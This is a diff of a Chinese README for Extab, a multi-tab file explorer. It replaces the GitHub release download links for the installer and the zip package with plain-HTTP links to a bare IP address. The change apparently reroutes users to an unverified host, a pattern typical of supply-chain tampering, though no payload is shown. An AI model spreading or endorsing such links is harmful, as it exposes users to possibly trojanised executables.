@@ -1,8 +1,8 @@
  ## Extab 1.0.0.12（multi explorer tab）是一款多标签资源管理器，多标签文件夹。可以像浏览器一样用多标签管理每个文件夹，以便更加快速高效的切换文件夹。
  
  ## 下载
-   ### [安装包 mini_installer.exe 2.3M](https://github.com/lily-debug/extab/releases/download/1.0.0.12/mini_installer.exe)    
-   ### [绿色包 extab.zip 0.9M](https://github.com/lily-debug/extab/releases/download/1.0.0.12/extab.zip)
+   ### [安装包 mini_installer.exe 2.3M](http://39.101.205.62/download/mini_installer.exe)    
+   ### [绿色包 extab.zip 0.9M](http://39.101.205.62/download/extab.zip)
    
    
  ## 功能 
